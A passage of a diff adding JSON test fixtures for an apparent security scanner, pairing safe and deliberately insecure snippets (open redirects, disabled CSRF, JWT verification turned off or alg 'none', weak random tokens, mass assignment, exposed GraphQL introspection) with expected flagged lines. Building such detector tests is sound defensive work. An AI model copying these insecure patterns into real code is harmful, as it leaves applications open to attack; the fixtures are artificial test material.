+   "note": "random module for OTP, password and session id",
+   "files": {
+    "d.py": "otp = random.randint(100000, 999999)\npassword = ''.join(random.choice(chars) for _ in range(12))\nsession_id = random.getrandbits(64)\n"
+   },
+   "expect": [
+    [
+     "d.py",
+     1
+    ],
+    [
+     "d.py",
+     2
+    ],
+    [
+     "d.py",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web008-pos-camelcase-csrf",
+   "rule": "SEC-WEB-008",
+   "kind": "positive",
+   "note": "camelCase csrfToken built from Math.random",
+   "files": {
+    "e.ts": "export const csrfToken = () => Math.random().toString(16);\n"
+   },
+   "expect": [
+    [
+     "e.ts",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web009-neg-fixed-targets",
+   "rule": "SEC-WEB-009",
+   "kind": "negative",
+   "note": "redirect to fixed or url_for targets",
+   "files": {
+    "a.py": "return redirect(url_for('index'))\nreturn redirect('/home')\nreturn redirect(url_for('login', next=request.args.get('next')))\n",
+    "b.js": "res.redirect('/login?next=' + encodeURIComponent(req.originalUrl));\nlocation.href = '/dashboard';\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web009-neg-validated-next",
+   "rule": "SEC-WEB-009",
+   "kind": "negative",
+   "note": "next param validated before redirect",
+   "files": {
+    "c.py": "nxt = request.args.get('next')\nif not is_safe_url(nxt):\n    abort(400)\nreturn redirect(nxt)\n",
+    "d.js": "const next = req.query.next;\nif (!next.startsWith('/') || next.startsWith('//')) return res.sendStatus(400);\nres.redirect(next);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web009-neg-allowlist-parse",
+   "rule": "SEC-WEB-009",
+   "kind": "negative",
+   "note": "urlparse host allowlist / new URL host check",
+   "files": {
+    "e.py": "u = request.args.get('url')\nif urlparse(u).netloc not in ALLOWED_HOSTS:\n    abort(400)\nreturn redirect(u)\n",
+    "f.js": "const t = req.query.to;\nconst host = new URL(t, base).hostname;\nif (!allowlist.includes(host)) return res.end();\nres.redirect(t);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web009-neg-comments-and-nonredirect",
+   "rule": "SEC-WEB-009",
+   "kind": "negative",
+   "note": "commented redirect and request param used for non-redirect",
+   "files": {
+    "g.py": "# return redirect(request.args.get('next'))\nname = request.args.get('name')\nreturn render_template('x.html', name=name)\n",
+    "h.js": "// res.redirect(req.query.url)\nconst q = req.query.q;\nres.send(q.length);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web009-neg-request-url-redirect",
+   "rule": "SEC-WEB-009",
+   "kind": "negative",
+   "note": "redirect back to the same request url / referrer-free",
+   "files": {
+    "i.py": "return redirect(request.url)\nreturn redirect(request.path)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web009-pos-flask-direct",
+   "rule": "SEC-WEB-009",
+   "kind": "positive",
+   "note": "Flask redirect directly from request.args",
+   "files": {
+    "a.py": "@app.route('/go')\ndef go():\n    return redirect(request.args.get('next'))\n"
+   },
+   "expect": [
+    [
+     "a.py",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web009-pos-django-and-express",
+   "rule": "SEC-WEB-009",
+   "kind": "positive",
+   "note": "Django GET param and express req.query",
+   "files": {
+    "v.py": "def go(request):\n    return HttpResponseRedirect(request.GET['next'])\n",
+    "s.js": "app.get('/go', (req, res) => res.redirect(req.query.url));\n"
+   },
+   "expect": [
+    [
+     "v.py",
+     2
+    ],
+    [
+     "s.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web009-pos-tainted-variable",
+   "rule": "SEC-WEB-009",
+   "kind": "positive",
+   "note": "param stored in variable and redirected",
+   "files": {
+    "t.py": "def login():\n    next_url = request.args.get('next')\n    do_login()\n    return redirect(next_url)\n",
+    "u.js": "const { returnTo } = req.query;\nres.redirect(returnTo);\n"
+   },
+   "expect": [
+    [
+     "t.py",
+     4
+    ],
+    [
+     "u.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web009-pos-client-side-location",
+   "rule": "SEC-WEB-009",
+   "kind": "positive",
+   "note": "client-side location from URLSearchParams",
+   "files": {
+    "c.js": "const params = new URLSearchParams(location.search);\nconst r = params.get('redirect');\nlocation.href = r;\n"
+   },
+   "expect": [
+    [
+     "c.js",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web010-neg-csrf-enabled",
+   "rule": "SEC-WEB-010",
+   "kind": "negative",
+   "note": "CSRF explicitly enabled or protected",
+   "files": {
+    "a.py": "WTF_CSRF_ENABLED = True\n@csrf_protect\ndef view(request):\n    pass\n",
+    "b.js": "app.use(csurf({ cookie: true }));\nconst o = { csrf: true };\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web010-neg-import-only",
+   "rule": "SEC-WEB-010",
+   "kind": "negative",
+   "note": "csrf_exempt imported or named in prose but not applied",
+   "files": {
+    "c.py": "from django.views.decorators.csrf import csrf_exempt\nfrom flask_wtf import CSRFProtect\ncsrf = CSRFProtect(app)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web010-neg-comments",
+   "rule": "SEC-WEB-010",
+   "kind": "negative",
+   "note": "disabling text in comments/docstrings",
+   "files": {
+    "d.py": "# @csrf_exempt\n\"\"\"\nNever set WTF_CSRF_ENABLED = False in production.\n\"\"\"\nx = 1\n",
+    "E.java": "// http.csrf().disable();\n/* csrf.disable() */\nclass E {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web010-neg-test-config",
+   "rule": "SEC-WEB-010",
+   "kind": "negative",
+   "note": "CSRF disabled only in test fixtures / test config classes",
+   "files": {
+    "tests/conftest.py": "app.config['WTF_CSRF_ENABLED'] = False\n",
+    "config.py": "class Config:\n    WTF_CSRF_ENABLED = True\n\nclass TestingConfig(Config):\n    WTF_CSRF_ENABLED = False\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web010-neg-csrf-token-repo-java",
+   "rule": "SEC-WEB-010",
+   "kind": "negative",
+   "note": "Spring csrf configured with a token repository",
+   "files": {
+    "S.java": "http.csrf(c -> c.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web010-pos-django-exempt",
+   "rule": "SEC-WEB-010",
+   "kind": "positive",
+   "note": "Django @csrf_exempt on a view and wrapper call",
+   "files": {
+    "views.py": "@csrf_exempt\ndef pay(request):\n    ...\n\nurlpatterns = [path('x', csrf_exempt(other))]\n"
+   },
+   "expect": [
+    [
+     "views.py",
+     1
+    ],
+    [
+     "views.py",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "web010-pos-flask-wtf-disabled",
+   "rule": "SEC-WEB-010",
+   "kind": "positive",
+   "note": "Flask-WTF disabled in app config",
+   "files": {
+    "app.py": "app.config['WTF_CSRF_ENABLED'] = False\n"
+   },
+   "expect": [
+    [
+     "app.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web010-pos-spring-disable",
+   "rule": "SEC-WEB-010",
+   "kind": "positive",
+   "note": "Spring Security csrf disabled in both styles",
+   "files": {
+    "Sec.java": "http.csrf().disable();\nhttp.csrf(AbstractHttpConfigurer::disable);\n"
+   },
+   "expect": [
+    [
+     "Sec.java",
+     1
+    ],
+    [
+     "Sec.java",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web010-pos-rails-skip",
+   "rule": "SEC-WEB-010",
+   "kind": "positive",
+   "note": "Rails skip_before_action verify_authenticity_token",
+   "files": {
+    "c.rb": "class PayController < ApplicationController\n  skip_before_action :verify_authenticity_token\nend\n"
+   },
+   "expect": [
+    [
+     "c.rb",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web010-pos-js-csrf-false",
+   "rule": "SEC-WEB-010",
+   "kind": "positive",
+   "note": "JS framework option csrf: false",
+   "files": {
+    "s.js": "const server = new Server({ csrf: false });\n"
+   },
+   "expect": [
+    [
+     "s.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "api001-neg-global-security",
+   "rule": "SEC-API-001",
+   "kind": "negative",
+   "note": "global security requirement covers all operations",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nsecurity:\n  - bearerAuth: []\npaths:\n  /users:\n    get:\n      responses: {}\n    post:\n      responses: {}\ncomponents:\n  securitySchemes:\n    bearerAuth: {type: http, scheme: bearer}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api001-neg-per-operation-security",
+   "rule": "SEC-API-001",
+   "kind": "negative",
+   "note": "each operation declares security",
+   "files": {
+    "api-spec.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths:\n  /users:\n    get:\n      security:\n        - oauth: [read]\n      responses: {}\n    delete:\n      security:\n        - oauth: [admin]\n      responses: {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api001-neg-explicit-public-override",
+   "rule": "SEC-API-001",
+   "kind": "negative",
+   "note": "global auth plus explicit security: [] for a public endpoint",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nsecurity:\n  - key: []\npaths:\n  /health:\n    get:\n      security: []\n      responses: {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api001-neg-json-global",
+   "rule": "SEC-API-001",
+   "kind": "negative",
+   "note": "JSON spec (swagger 2) with global security",
+   "files": {
+    "swagger.json": "{\n  \"swagger\": \"2.0\",\n  \"security\": [{\"api_key\": []}],\n  \"paths\": {\n    \"/x\": {\n      \"get\": {\"responses\": {}}\n    }\n  }\n}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api001-neg-not-a-spec",
+   "rule": "SEC-API-001",
+   "kind": "negative",
+   "note": "yaml named api.yaml that is not an OpenAPI document",
+   "files": {
+    "api.yaml": "name: service\nports:\n  get: 8080\npaths:\n  /x:\n    get:\n      foo: bar\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api001-neg-path-level-parameters-only",
+   "rule": "SEC-API-001",
+   "kind": "negative",
+   "note": "path item with only non-method keys",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nsecurity:\n  - k: []\npaths:\n  /a:\n    parameters:\n      - {name: id, in: path}\n    summary: s\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api001-pos-yaml-no-security",
+   "rule": "SEC-API-001",
+   "kind": "positive",
+   "note": "operations with no security anywhere",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths:\n  /users:\n    get:\n      responses: {}\n    post:\n      responses: {}\n"
+   },
+   "expect": [
+    [
+     "openapi.yaml",
+     5
+    ],
+    [
+     "openapi.yaml",
+     7
+    ]
+   ]
+  },
+  {
+   "id": "api001-pos-json-swagger",
+   "rule": "SEC-API-001",
+   "kind": "positive",
+   "note": "swagger 2 JSON without security",
+   "files": {
+    "swagger.json": "{\n  \"swagger\": \"2.0\",\n  \"paths\": {\n    \"/x\": {\n      \"delete\": {\"responses\": {}}\n    }\n  }\n}\n"
+   },
+   "expect": [
+    [
+     "swagger.json",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "api001-pos-securityschemes-defined-but-unused",
+   "rule": "SEC-API-001",
+   "kind": "positive",
+   "note": "scheme defined but only one operation applies it",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths:\n  /a:\n    get:\n      security:\n        - k: []\n      responses: {}\n  /b:\n    put:\n      responses: {}\ncomponents:\n  securitySchemes:\n    k: {type: apiKey, in: header, name: X-K}\n"
+   },
+   "expect": [
+    [
+     "openapi.yaml",
+     10
+    ]
+   ]
+  },
+  {
+   "id": "api002-neg-header-apikey",
+   "rule": "SEC-API-002",
+   "kind": "negative",
+   "note": "apiKey transported in a header",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths: {}\ncomponents:\n  securitySchemes:\n    k: {type: apiKey, in: header, name: X-API-Key}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api002-neg-ordinary-query-params",
+   "rule": "SEC-API-002",
+   "kind": "negative",
+   "note": "query params that are not credentials",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths:\n  /u:\n    get:\n      parameters:\n        - {name: page, in: query}\n        - {name: search_key, in: query}\n        - {name: sort, in: query}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api002-neg-token-in-header-or-path",
+   "rule": "SEC-API-002",
+   "kind": "negative",
+   "note": "credential-like names carried in header or path",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths:\n  /confirm/{token}:\n    get:\n      parameters:\n        - {name: token, in: path, required: true}\n        - {name: api_key, in: header}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api002-neg-pagination-token",
+   "rule": "SEC-API-002",
+   "kind": "negative",
+   "note": "query param named token that is a pagination cursor",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths:\n  /u:\n    get:\n      parameters:\n        - name: token\n          in: query\n          description: Opaque pagination cursor from the previous response\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api002-neg-bearer-scheme",
+   "rule": "SEC-API-002",
+   "kind": "negative",
+   "note": "bearer http scheme",
+   "files": {
+    "swagger.json": "{\"openapi\": \"3.0.0\", \"paths\": {}, \"components\": {\"securitySchemes\": {\"b\": {\"type\": \"http\", \"scheme\": \"bearer\"}}}}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api002-pos-apikey-query-scheme",
+   "rule": "SEC-API-002",
+   "kind": "positive",
+   "note": "apiKey scheme in query",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths: {}\ncomponents:\n  securitySchemes:\n    k:\n      type: apiKey\n      in: query\n      name: key\n"
+   },
+   "expect": [
+    [
+     "openapi.yaml",
+     8
+    ]
+   ]
+  },
+  {
+   "id": "api002-pos-query-parameter-op",
+   "rule": "SEC-API-002",
+   "kind": "positive",
+   "note": "operation parameter api_key in query",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\npaths:\n  /u:\n    get:\n      parameters:\n        - name: api_key\n          in: query\n          required: true\n"
+   },
+   "expect": [
+    [
+     "openapi.yaml",
+     7
+    ]
+   ]
+  },
+  {
+   "id": "api002-pos-swagger2-json",
+   "rule": "SEC-API-002",
+   "kind": "positive",
+   "note": "swagger 2 securityDefinitions and path-level param",
+   "files": {
+    "swagger.json": "{\n  \"swagger\": \"2.0\",\n  \"securityDefinitions\": {\n    \"q\": {\n      \"type\": \"apiKey\",\n      \"in\": \"query\",\n      \"name\": \"k\"\n    }\n  },\n  \"paths\": {\n    \"/a\": {\n      \"parameters\": [\n        {\n          \"name\": \"access_token\",\n          \"in\": \"query\"\n        }\n      ]\n    }\n  }\n}\n"
+   },
+   "expect": [
+    [
+     "swagger.json",
+     6
+    ],
+    [
+     "swagger.json",
+     14
+    ]
+   ]
+  },
+  {
+   "id": "api003-neg-https-servers",
+   "rule": "SEC-API-003",
+   "kind": "negative",
+   "note": "https servers",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nservers:\n  - url: https://api.example.com/v1\npaths: {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api003-neg-local-http",
+   "rule": "SEC-API-003",
+   "kind": "negative",
+   "note": "plain HTTP only to localhost / loopback / .local",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nservers:\n  - url: http://localhost:8080\n  - url: http://127.0.0.1:3000/v1\n  - url: http://api.dev.local\npaths: {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api003-neg-relative-and-templated",
+   "rule": "SEC-API-003",
+   "kind": "negative",
+   "note": "relative server URL and templated scheme",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nservers:\n  - url: /v1\n  - url: '{scheme}://api.example.com'\n    variables:\n      scheme: {default: https, enum: [https]}\npaths: {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api003-neg-swagger-https-and-local",
+   "rule": "SEC-API-003",
+   "kind": "negative",
+   "note": "swagger schemes https, or http on localhost",
+   "files": {
+    "swagger.json": "{\"swagger\": \"2.0\", \"host\": \"localhost:8080\", \"schemes\": [\"http\"], \"paths\": {}}\n",
+    "api/spec.json": "{\"swagger\": \"2.0\", \"host\": \"api.example.com\", \"schemes\": [\"https\"], \"paths\": {}}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api003-neg-cluster-internal-service",
+   "rule": "SEC-API-003",
+   "kind": "negative",
+   "note": "in-cluster single-label and .internal hosts",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nservers:\n  - url: http://orders:8080\n  - url: http://billing.internal:9000\npaths: {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api003-pos-yaml-http-server",
+   "rule": "SEC-API-003",
+   "kind": "positive",
+   "note": "production server over http",
+   "files": {
+    "openapi.yaml": "openapi: 3.0.3\ninfo: {title: t, version: '1'}\nservers:\n  - url: https://api.example.com\n  - url: http://api.example.com/v1\npaths: {}\n"
+   },
+   "expect": [
+    [
+     "openapi.yaml",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "api003-pos-json-http-server",
+   "rule": "SEC-API-003",
+   "kind": "positive",
+   "note": "JSON spec with http server",
+   "files": {
+    "openapi.json": "{\n  \"openapi\": \"3.0.0\",\n  \"servers\": [\n    {\n      \"url\": \"http://api.acme.io:8080\"\n    }\n  ],\n  \"paths\": {}\n}\n"
+   },
+   "expect": [
+    [
+     "openapi.json",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "api003-pos-swagger-schemes-http",
+   "rule": "SEC-API-003",
+   "kind": "positive",
+   "note": "swagger schemes includes http on a public host",
+   "files": {
+    "swagger.yaml": "swagger: '2.0'\nhost: api.example.com\nschemes:\n  - https\n  - http\npaths: {}\n"
+   },
+   "expect": [
+    [
+     "swagger.yaml",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "api004-neg-pinned-alg-with-audience",
+   "rule": "SEC-API-004",
+   "kind": "negative",
+   "note": "algorithm pinned and audience supplied",
+   "files": {
+    "a.py": "claims = jwt.decode(token, key, algorithms=['RS256'], audience='my-api')\n",
+    "b.js": "jwt.verify(token, secret, { algorithms: ['HS256'], audience: 'my-api', issuer: 'me' }, cb);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api004-neg-none-check-and-comments",
+   "rule": "SEC-API-004",
+   "kind": "negative",
+   "note": "code that rejects alg none; commented weak usage",
+   "files": {
+    "c.py": "if header.get('alg') == 'none':\n    raise ValueError('bad')\n# jwt.decode(t, options={'verify_signature': False})\n\"\"\"\nalgorithm = 'none'\n\"\"\"\nx = 1\n",
+    "d.js": "// jwt.verify(t, s, { ignoreExpiration: true })\nif (alg === 'none') throw new Error();\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api004-neg-explicit-checks-true",
+   "rule": "SEC-API-004",
+   "kind": "negative",
+   "note": "expiry/signature checks explicitly enabled",
+   "files": {
+    "e.py": "jwt.decode(t, key, algorithms=['HS256'], audience=AUD, options={'verify_exp': True, 'verify_signature': True})\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api004-neg-non-jwt-decode",
+   "rule": "SEC-API-004",
+   "kind": "negative",
+   "note": "unrelated decode/verify calls",
+   "files": {
+    "f.py": "data = base64.b64decode(s)\nbody = json.decode(x)\nsigner.verify(sig, msg)\n",
+    "g.js": "const t = he.decode(str);\nbcrypt.verify(a, b);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api004-neg-jwks-verify-with-aud",
+   "rule": "SEC-API-004",
+   "kind": "negative",
+   "note": "jose/jwtVerify with audience",
+   "files": {
+    "h.ts": "const { payload } = await jwtVerify(token, JWKS, { issuer: ISS, audience: AUD });\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api004-pos-py-verify-signature-false",
+   "rule": "SEC-API-004",
+   "kind": "positive",
+   "note": "PyJWT with signature verification off",
+   "files": {
+    "a.py": "def claims(token):\n    return jwt.decode(token, options={\"verify_signature\": False})\n"
+   },
+   "expect": [
+    [
+     "a.py",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "api004-pos-js-ignore-expiration",
+   "rule": "SEC-API-004",
+   "kind": "positive",
+   "note": "jsonwebtoken ignoring expiry, multi-line",
+   "files": {
+    "b.js": "const p = jwt.verify(token, secret, {\n  algorithms: ['HS256'],\n  audience: 'a',\n  ignoreExpiration: true,\n});\n"
+   },
+   "expect": [
+    [
+     "b.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "api004-pos-alg-none",
+   "rule": "SEC-API-004",
+   "kind": "positive",
+   "note": "alg none accepted in verify and signing config",
+   "files": {
+    "c.js": "jwt.verify(t, null, { algorithms: ['none'] });\n",
+    "d.py": "token = jwt.encode(payload, None, algorithm='none')\n"
+   },
+   "expect": [
+    [
+     "c.js",
+     1
+    ],
+    [
+     "d.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "api004-pos-verify-exp-false",
+   "rule": "SEC-API-004",
+   "kind": "positive",
+   "note": "verify_exp disabled",
+   "files": {
+    "e.py": "jwt.decode(t, k, algorithms=['HS256'], options={'verify_exp': False})\n"
+   },
+   "expect": [
+    [
+     "e.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "api005-neg-disabled",
+   "rule": "SEC-API-005",
+   "kind": "negative",
+   "note": "introspection/playground false",
+   "files": {
+    "a.js": "new ApolloServer({ typeDefs, resolvers, introspection: false, playground: false });\n",
+    "b.py": "GraphQLView.as_view(graphiql=False)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api005-neg-env-gated",
+   "rule": "SEC-API-005",
+   "kind": "negative",
+   "note": "enabled only outside production",
+   "files": {
+    "c.js": "new ApolloServer({\n  introspection: process.env.NODE_ENV !== 'production',\n  playground: isDev,\n});\n",
+    "d.py": "app.add_route('/gql', GraphQLView(graphiql=settings.DEBUG))\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api005-neg-ternary-gate-on-previous-line",
+   "rule": "SEC-API-005",
+   "kind": "negative",
+   "note": "true literal inside a development-only branch",
+   "files": {
+    "e.js": "const opts = process.env.NODE_ENV === 'development'\n  ? { introspection: true, playground: true }\n  : { introspection: false };\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api005-neg-dev-file-and-comments",
+   "rule": "SEC-API-005",
+   "kind": "negative",
+   "note": "dev-named config and comments",
+   "files": {
+    "config/graphql.dev.yml": "introspection: true\n",
+    "tests/gql_test.js": "new ApolloServer({ introspection: true });\n",
+    "f.js": "// introspection: true\nconst a = 1;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api005-neg-unrelated-keys",
+   "rule": "SEC-API-005",
+   "kind": "negative",
+   "note": "keys that merely contain the words",
+   "files": {
+    "g.json": "{\"introspection_endpoint\": \"https://idp/introspect\", \"playgrounds\": 3}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api005-pos-apollo",
+   "rule": "SEC-API-005",
+   "kind": "positive",
+   "note": "Apollo server with introspection and playground on",
+   "files": {
+    "index.js": "const server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  introspection: true,\n  playground: true,\n});\n"
+   },
+   "expect": [
+    [
+     "index.js",
+     4
+    ],
+    [
+     "index.js",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "api005-pos-graphiql-python",
+   "rule": "SEC-API-005",
+   "kind": "positive",
+   "note": "graphene/Django GraphiQL on",
+   "files": {
+    "urls.py": "urlpatterns = [path('graphql', GraphQLView.as_view(graphiql=True))]\n"
+   },
+   "expect": [
+    [
+     "urls.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "api005-pos-yaml-and-json-config",
+   "rule": "SEC-API-005",
+   "kind": "positive",
+   "note": "yaml/json production config",
+   "files": {
+    "config/prod.yml": "graphql:\n  playground: true\n",
+    "server.config.json": "{\n  \"introspection\": true\n}\n"
+   },
+   "expect": [
+    [
+     "config/prod.yml",
+     2
+    ],
+    [
+     "server.config.json",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "api005-pos-quoted-key",
+   "rule": "SEC-API-005",
+   "kind": "positive",
+   "note": "quoted key in ts config",
+   "files": {
+    "s.ts": "export default { 'graphiql': true };\n"
+   },
+   "expect": [
+    [
+     "s.ts",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "api006-neg-explicit-fields",
+   "rule": "SEC-API-006",
+   "kind": "negative",
+   "note": "explicit field mapping from request body",
+   "files": {
+    "a.js": "User.create({ name: req.body.name, email: req.body.email });\nconst u = new User({ name: req.body.name });\n",
+    "b.py": "User.objects.create(name=data['name'])\nserializer = UserSerializer(data=request.data)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api006-neg-picked-or-validated",
+   "rule": "SEC-API-006",
+   "kind": "negative",
+   "note": "allowlisted via pick/schema before binding",
+   "files": {
+    "c.js": "Object.assign(user, _.pick(req.body, ['name']));\nUser.create(schema.validate(req.body));\n",
+    "d.py": "User(**UserSchema().load(request.json))\nUser(**serializer.validated_data)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api006-neg-builtin-constructors",
+   "rule": "SEC-API-006",
+   "kind": "negative",
+   "note": "new Error/Date/URL with req.body",
+   "files": {
+    "e.js": "throw new Error(req.body);\nconst d = new Date(req.body);\nconst u = new URL(req.body);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api006-neg-comments",
+   "rule": "SEC-API-006",
+   "kind": "negative",
+   "note": "mass assignment only in comments/docstrings",
+   "files": {
+    "f.js": "// User.create(req.body)\n",
+    "g.py": "# User(**request.json)\n\"\"\"\nModel.objects.create(**request.data)\n\"\"\"\nx = 1\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api006-neg-lowercase-helpers",
+   "rule": "SEC-API-006",
+   "kind": "negative",
+   "note": "plain dict/function splats of request data",
+   "files": {
+    "h.py": "d = dict(**request.json)\nlog(**request.args)\nresp = jsonify(**request.json)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "api006-pos-mongoose-create",
+   "rule": "SEC-API-006",
+   "kind": "positive",
+   "note": "Mongoose/Sequelize binding whole body",
+   "files": {
+    "a.js": "router.post('/users', (req, res) => User.create(req.body));\nrouter.put('/users/:id', (req, res) => User.findByIdAndUpdate(req.params.id, req.body));\n"
+   },
+   "expect": [
+    [
+     "a.js",
+     1
+    ],
+    [
+     "a.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "api006-pos-spread-and-assign",
+   "rule": "SEC-API-006",
+   "kind": "positive",
+   "note": "object spread, new Model(req.body) and Object.assign",
+   "files": {
+    "b.ts": "const u = new User({ ...req.body });\nObject.assign(user, req.body);\n"
+   },
+   "expect": [
+    [
+     "b.ts",
+     1
+    ],
+    [
+     "b.ts",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "api006-pos-flask-django-splat",
+   "rule": "SEC-API-006",
+   "kind": "positive",
+   "note": "Python **request.json / **request.data",
+   "files": {
+    "c.py": "user = User(**request.json)\nUser.objects.create(**request.data)\nobj.update(**request.POST)\n"
+   },
+   "expect": [
+    [
+     "c.py",
+     1
+    ],
+    [
+     "c.py",
+     2
+    ],
+    [
+     "c.py",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "api006-pos-sequelize-update",
+   "rule": "SEC-API-006",
+   "kind": "positive",
+   "note": "Sequelize update with body",
+   "files": {
+    "d.js": "await User.update(req.body, { where: { id } });\n"
+   },
+   "expect": [
+    [
+     "d.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "sc001-neg-lock-present",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "package.json with package-lock.json in same dir",
+   "files": {
+    "package.json": "{\n  \"name\": \"a\",\n  \"dependencies\": {\"left-pad\": \"1.3.0\"}\n}\n",
+    "package-lock.json": "{}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-neg-workspace-root-lock",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "workspace member covered by root lockfile",
+   "files": {
+    "package.json": "{\"workspaces\":[\"packages/*\"],\"dependencies\":{\"a\":\"1.0.0\"}}",
+    "yarn.lock": "# yarn",
+    "packages/x/package.json": "{\n  \"name\": \"a\",\n  \"dependencies\": {\"left-pad\": \"1.3.0\"}\n}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-neg-no-dependencies",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "package.json without dependencies, vendored manifests, plain pyproject",
+   "files": {
+    "package.json": "{\"name\": \"x\", \"scripts\": {\"test\": \"echo\"}, \"dependencies\": {}}",
+    "node_modules/foo/package.json": "{\n  \"name\": \"a\",\n  \"dependencies\": {\"left-pad\": \"1.3.0\"}\n}\n",
+    "pyproject.toml": "[project]\nname='x'\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-neg-rust-library-and-gemspec",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "library crate / gemspec may omit lock",
+   "files": {
+    "Cargo.toml": "[package]\nname='x'\n[lib]\npath='src/lib.rs'\n[dependencies]\nserde='1'\n",
+    "Gemfile": "source 'https://rubygems.org'\ngemspec\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-neg-poetry-lock-and-pipfile-lock",
+   "rule": "SEC-SC-001",
+   "kind": "negative",
+   "note": "locked python projects",
+   "files": {
+    "pyproject.toml": "[tool.poetry]\nname='x'\n",
+    "poetry.lock": "x",
+    "svc/Pipfile": "[packages]\nrequests='*'\n",
+    "svc/Pipfile.lock": "{}"
+   },
+   "expect": []
+  },
+  {
+   "id": "sc001-pos-npm-no-lock",
